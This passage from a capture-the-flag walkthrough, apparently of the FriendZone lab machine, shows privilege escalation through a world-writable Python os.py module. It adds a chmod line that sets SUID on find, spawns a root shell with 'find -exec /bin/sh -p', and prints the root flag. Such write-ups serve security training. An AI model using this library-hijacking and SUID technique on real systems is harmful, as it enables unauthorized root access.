AcceptEnv LANG LC_*
Subsystem       sftp    /usr/lib/openssh/sftp-server

```

The output above only displays uncommented lines. As we can see, the line "PasswordAuthentication no" is not shown, and is therefore commented. This means that we should be able to SSH into the target. Let's try it:

```
└─$ ssh friend@10.10.10.123                    
friend@10.10.10.123's password: 
Welcome to Ubuntu 18.04.1 LTS (GNU/Linux 4.15.0-36-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

You have mail.
Last login: Tue Nov  9 20:01:38 2021 from 10.10.16.3
friend@FriendZone:~$
```

Perfect. This is much better. Let's conitnue with our enumeration and have a look at the reporter.py script:

```
friend@FriendZone:~$ cat /opt/server_admin/reporter.py 
#!/usr/bin/python

import os

to_address = "admin1@friendzone.com"
from_address = "admin2@friendzone.com"

print "[+] Trying to send email to %s"%to_address

#command = ''' mailsend -to admin2@friendzone.com -from admin1@friendzone.com -ssl -port 465 -auth -smtp smtp.gmail.co-sub scheduled results email +cc +bc -v -user you -pass "PAPAP"'''

#os.system(command)

# I need to edit the script later
# Sam ~ python developer

```

The script appears to be incomplete, and when it is run it doesn't actually do anything, except import the python os module, define a couple of variables, and print a statement, and so, this looks like a dead end as we cannot write to the script.

Let's transfer Linpeas.sh to the target and run it.

#### Linpeas.sh

After examining the output from linpeas, we see that we have write access to a couple of interesting files as shown below, specifically, the python OS module:

```
╔══════════╣ Interesting writable files owned by me or writable by everyone (not in Home) (max 500)
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-files                                      
/dev/mqueue                                                                                                       
/dev/shm
/etc/Development
/etc/sambafiles
/home/friend
/run/lock
/run/user/1000
/run/user/1000/gnupg
/run/user/1000/systemd
/tmp
/tmp/.font-unix
/tmp/.ICE-unix
/tmp/.Test-unix
/tmp/.X11-unix
/tmp/.XIM-unix
/usr/lib/python2.7
/usr/lib/python2.7/os.py
/usr/lib/python2.7/os.pyc
/var/lib/php/sessions
/var/mail/friend
/var/spool/samba
/var/tmp

```

We know that the OS module is being imported by the reporter.py script. If the /opt/server\_admin directory was writable, we could just add our own os.py file in there, which would then be imported by the reporter.py script whenever the scheduled job ran. However, we don't have write access to the /opt/server directory, and so we can't use this technique, which is also known as python module hijacking.

We do however have write access to the os.py module, and so all we need to do is add some python code to it in order to get code execution as root and thus escalate our privileges. There are a few ways to escalate privileges here, including the following:

* add new user with root privilegs
* modify /etc/passwd directly by adding a new root user
* modify a known binary (gtfobins) that has the ability to escalate privileges (owned by root) by enabling the SUID bit
* get a new reverse shell as root

There are I'm sure a few more ways this can be done, and perhaps some ways that are more OPSEC aware. For this box, let's simply set the SUID bit on the find command.

## Privilege Escalation

We can modify the SUID bit on the "find" binary by simply adding the following line of code to the os.py python library:&#x20;

```
chmod("/usr/bin/find", 0o4755)
```

More information about "chmod" and the octal permission values and how they are calculated can be found on the following page:

{% embed url="https://docs.oracle.com/cd/E19455-01/805-7229/6j6q8svd8" %}

For more information on the operating system chmod python interface:

{% embed url="https://docs.python.org/2.7/library/os.html#os.chmod" %}

Before the modification above, the permissions on the "find" binary were set as follows:

```
friend@FriendZone:~$ ls -la /usr/bin/find
-rwxr-xr-x 1 root root 238080 Nov  5  2017 /usr/bin/find

```

After our modification of the python os.py library, the permissions are set as follows:

```
friend@FriendZone:~$ ls -la /usr/bin/find
-rwsr-xr-x 1 root root 238080 Nov  5  2017 /usr/bin/find

```

All we need to do now is run the "find" command as follows, and grab the root flag.

```
friend@FriendZone:~$ find . -exec /bin/sh -p \; -quit
# id
uid=1000(friend) gid=1000(friend) euid=0(root) groups=1000(friend),4(adm),24(cdrom),30(dip),46(plugdev),111(lpadmin),112(sambashare)
# cat /root/root.txt
b0e6c60b82cf96e9855ac1656a9e90c7
#
```

## Resources​ ​ ​

{% embed url="https://rastating.github.io/privilege-escalation-via-python-library-hijacking" %}

{% embed url="https://docs.oracle.com/cd/E19455-01/805-7229/6j6q8svd8" %}

{% embed url="https://docs.python.org/2.7/library/os.html?highlight=chmod#os.chmod" %}







